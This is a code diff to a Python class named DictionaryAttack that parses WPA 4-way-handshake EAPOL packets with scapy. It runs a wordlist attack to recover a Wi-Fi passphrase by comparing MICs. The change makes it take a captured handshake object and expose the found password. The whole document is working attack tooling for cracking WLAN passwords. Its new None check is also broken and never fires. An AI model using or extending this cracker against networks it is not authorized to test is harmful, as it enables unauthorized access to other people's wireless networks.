@@ -1,17 +1,20 @@
-from typing import List, TextIO
+from typing import List, TextIO, Union
 import os
-from scapy.all import rdpcap
-from scapy.layers.dot11 import Dot11
+from scapy.layers.dot11 import Dot11, PacketList
 from scapy.layers.eap import EAPOL
-from .utils import EAPOLParser, KeyGeneration, _pcap_path, _dictionary_folder
+from .utils import EAPOLParser, KeyGeneration, _dictionary_folder
 
 
 class DictionaryAttack:
 
-    def __init__(self, ssid: str, pcap_path: str = _pcap_path, dictionary_folder: str = _dictionary_folder) -> None:
+    def __init__(self, ssid: str, handshake: PacketList, dictionary_folder: str = _dictionary_folder) -> None:
         self._ssid: str = ssid
-        self._pcap_path: str = pcap_path
+        self._handshake: PacketList = handshake
         self._dictionary_folder: str = dictionary_folder
+        self._wlan_psw: None = None
+        if self._handshake is Union[None]:
+            print("No valid 4-Way-Handshake")
+            return
         self._parse_pcap()
         self._start_dictionary_attack()
 
@@ -19,7 +22,7 @@ class DictionaryAttack:
         i: int = 0
         self._eapol_data: List[bytes] = []
         self._eapol_mic: List[bytes] = []
-        for packet in rdpcap(filename=self._pcap_path):
+        for packet in self._handshake:
             eapol: EAPOLParser = EAPOLParser(eapol_packet=packet[EAPOL])
             try:
                 self._anonce: bytes = eapol.get_wpa_key_anonce()
@@ -38,7 +41,6 @@ class DictionaryAttack:
             i += 1
 
     def _start_dictionary_attack(self) -> None:
-        wlan_psw: None = None
         dictionary: List[str] = []
         DictionaryAttack._get_dictionary(
             dictionary=dictionary,
@@ -70,12 +72,15 @@ class DictionaryAttack:
                 else:
                     mic_match = False
             if mic_match:
-                wlan_psw: str = psw
+                self._wlan_psw: str = psw
                 break
-        if wlan_psw:
-            print(f"WLAN PSW FOUND: '{wlan_psw}'")
+        if self._wlan_psw:
+            print(f"WLAN PSW FOUND: '{self._wlan_psw}'")
         else:
             print("WLAN PSW NOT FOUND")
+
+    def get_wlan_psw(self) -> str:
+        return self._wlan_psw
 
     @staticmethod
     def _get_dictionary(dictionary: List[str], path: str) -> None:
